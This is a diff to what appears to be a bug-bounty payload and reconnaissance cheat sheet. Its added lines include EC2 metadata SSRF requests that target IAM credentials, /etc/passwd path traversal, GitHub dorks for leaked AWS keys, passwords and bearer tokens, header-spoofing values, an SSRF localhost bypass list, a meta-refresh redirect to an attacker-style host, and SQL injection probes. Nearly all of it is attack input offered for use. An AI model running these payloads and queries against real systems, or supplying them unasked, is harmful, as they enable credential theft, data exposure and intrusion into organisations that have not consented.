@@ -1,11 +1,37 @@
 
 
 
-X-Rewrite-Url:
-X-Original-Url:
-X-Forwarded-Host:
-X-Forwarded-Port:
-X-Forwarded-Scheme:
+Finding open redirect? use dork to find it
+site:http://target.com inurl:%2f
+site:http://target.com inurl:%3f
+site:http://target.com inurl:%3a
+If you found an SSRF vulnerability that runs on EC2, try requesting :
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/user-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/IAM_USER_ROLE_HERE
+
+xmlrpc.php
+file:///etc/passwd
+=../../../etc/passwd%00
+
+
+site:http://target.com inurl:admin intext:files ext:aspx
+
+org:Target "bucket_name"
+org:Target "aws_access_key"
+org:Target "aws_secret_key"
+org:Target "S3_BUCKET"
+org:Target "S3_ACCESS_KEY_ID"
+org:Target "S3_SECRET_ACCESS_KEY"
+org:Target "S3_ENDPOINT"
+org:Target  "AWS_ACCESS_KEY_ID"
+org:Target  "list_aws_accounts"
+
+X-Rewrite-Url: 127.0.0.1
+X-Original-Url: 127.0.0.1
+X-Forwarded-Host: 127.0.0.1
+X-Forwarded-Port: 127.0.0.1
+X-Forwarded-Scheme: 127.0.0.1
 X-Frame-Options: Allow
 X-Forwarded-For: 127.0.0.1
 X-Client-IP: 127.0.0.1
@@ -24,10 +50,7 @@ debug/pprof/FUZZ
 
 0;url=http:&#x2F;&#x2F;www.evilzone.com"HTTP-EQUIV="refresh"any=".arexport
 
-</CrIPT>
-%3C%2F%53C%72I%50%54%2F%3E
-alert
-aler%26%23116;%3E
+
 
 SSRF Bypass list for localhost (127.0.0.1):
 http://127.1/
@@ -113,3 +136,50 @@ site:http://bitbucket.org "company"
 site:*.atlassian.net "company"
 atlassian.net "company"
 inurl:gitlab "company"
+
+
+
+site:http://repl.it intext:company
+site:http://zoom.us inurl:company
+site:http://atlassian.net inurl:company
+site:http://s3.amazonaws.com inurl:company
+site:http://pastebin.com inurl:company
+site:http://company.com intitle:Index of
+site:http://company.com ext:log
+site:http://company.com inurl:redir | inurl:redirect | inurl:return | inurl:to
+
+site:http://company.com ext:doc | ext:docx | ext:odt | ext:pd
+site:http://company.com ext:sql
+site:http://scribd.com intext:http://internal.company.com
+
+"company name" db_password
+"company name" "Authorization: Bearer"
+"company name" filename:vim_settings.xml
+"company name" language:shell
+"company name" language:python
+"company name" fb_secret
+"company name" sendkeys
+"company name" pwd
+"company name" mailgun
+"company name" mailchimp
+"company name" dotfiles
+"company name" filename:.dockercfg auth
+"company name" apikey
+
+
+
+
+/?q=1
+/?q=1'
+/?q=1"
+/?q=[1]
+/?q[]=1
+/?q=1`
+/?q=1\
+/?q=1/*'*/
+/?q=1/*!1111'*/
+/?q=1'||'asd'||'   <== concat string
+/?q=1' or '1'='1
+/?q=1 or 1=1
+/?q='or''='
+
